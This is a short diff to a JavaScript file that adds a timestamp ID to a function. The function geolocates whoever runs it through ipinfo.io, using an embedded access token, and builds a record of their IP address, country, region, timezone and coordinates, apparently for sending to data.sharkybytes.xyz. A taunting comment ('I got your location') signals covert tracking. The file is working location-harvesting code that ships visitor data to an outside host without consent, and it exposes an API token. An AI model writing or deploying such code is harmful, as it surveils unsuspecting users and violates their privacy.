@@ -1,11 +1,19 @@
 //** It's too late now, I got your location. */ //
 
+// UID //
+const uid = () => {
+    const head = Date.now().toString(36);
+    return head
+};
+
 // POST METHOD FUNCTION //
 async function postRequest() {
+    const id = uid();
     const apiURL = 'https://data.sharkybytes.xyz/'; // API URL
     const request = await fetch("https://ipinfo.io/json?token=0282fbb2286a84"); // LOCATOR URL
     const { ip, country, region, timezone, loc } = await request.json();
     const postData = {
+        '_id': id,
         'IPv4': ip,
         'country': country,
         'region': region,
